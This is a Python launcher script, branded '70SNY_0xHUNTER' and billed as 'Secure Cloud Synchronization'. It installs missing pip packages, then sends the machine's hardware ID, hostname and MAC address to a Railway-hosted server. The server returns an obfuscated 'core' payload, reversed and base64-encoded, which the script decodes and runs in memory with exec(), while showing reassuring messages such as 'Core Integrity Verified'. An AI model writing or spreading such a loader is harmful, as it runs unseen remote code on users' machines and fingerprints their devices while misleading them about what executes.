import subprocess
import requests
import os
import sys
import uuid
import platform
import base64
import socket
import time
import importlib

RAILWAY_URL = "web-production-6e33.up.railway.app"

def get_device_info():
    try:
        hwid = str(uuid.getnode())
        hostname = socket.gethostname()
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        return hwid, hostname, mac
    except:

        return "Unknown", "Unknown", "Unknown"
def install_from_requirements():
    req_file = os.path.join(os.path.dirname(__file__), "requirements.txt")
    if not os.path.exists(req_file):
        return

    missing_libs = []
    with open(req_file, "r") as f:
        libraries = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    for lib in libraries:
        lib_name = lib.split('==')[0].split('>=')[0].strip().lower()
        import_mapping = {
            "flask-socketio": "flask_socketio",
            "googlesearch-python": "googlesearch",
            "beautifulsoup4": "bs4",
            "python-dotenv": "dotenv"
        }
        import_name = import_mapping.get(lib_name, lib_name)
        try:
            __import__(import_name)
        except ImportError:
            missing_libs.append(lib)

    if missing_libs:
        print(f"\n[!] Missing Dependencies: {', '.join(missing_libs)}")
        choice = input("👉 Install required components now? (y/n): ").lower().strip()

        if choice == 'y':
            for lib in missing_libs:
                lib_name = lib.split('==')[0].split('>=')[0].strip().lower()
                print(f"📥 Installing {lib_name}...")
                try:
                  
                    subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
                except Exception:
                
                    print(f"\n❌ Failed to install {lib_name} automatically.")
                    
                    if platform.system() == "Linux":
                        print("💡 [KALI/LINUX DETECTED]: Your system blocks global pip installs (PEP 668).")
                        print(f"👉 Run this command manually: \n   sudo pip install {lib} --break-system-packages")
                    
                    elif platform.system() == "Windows":
                        print("💡 [WINDOWS DETECTED]: Permissions issue or Path error.")
                        print(f"👉 Try running your Terminal/CMD as 'Administrator' and run: \n   pip install {lib}")
                    
                    print("-" * 30)
                    time.sleep(1)

           
            if any("playwright" in l.lower() for l in missing_libs):
                try:
                    print("🌐 Initializing Playwright Core...")
                    subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
                except:
                    print("❌ Playwright initialization failed.")
                    print("👉 Run manually: python -m playwright install chromium")

            print("\n✅ Setup attempt finished. Please review any errors above.")
            input("Press Enter to try restarting the script...")
            os.execv(sys.executable, ['python'] + sys.argv)
        else:
            print("\n🛑 Execution aborted.")
            sys.exit()

def fetch_and_run():
    hwid, hostname, mac = get_device_info()
    params = {'hwid': hwid, 'device': hostname, 'mac': mac}

    try:
        print(f"🛰️ Connecting to Cloud Engine...")
        response = requests.get(
            f"https://{RAILWAY_URL}/get_core", 
            params=params, 
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()
            masked_payload = data.get("core", "")
            
            if masked_payload:
                print("🔓 Decrypting Security Layer...")
                unmasked_data = masked_payload[::-1]
                decoded_code = base64.b64decode(unmasked_data.encode('utf-8')).decode('utf-8')
                
                print("✅ Core Integrity Verified.")
                print("🚀 Booting Engine in Memory...")
                exec(decoded_code, globals())
            else:
                print("⚠️ Error: Engine Core is empty.")
        else:
            print(f"❌ Server Error: {response.status_code}")
    except Exception as e:
        print(f"❌ Boot Failure: {e}")

def main():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print("="*45)
    print("            🚀 70SNY_0xHUNTER ")
    print("         Secure Cloud Synchronization")
    print("="*45)
    
    
    try:
        import requests
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests

   
    install_from_requirements()
    
   
    fetch_and_run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
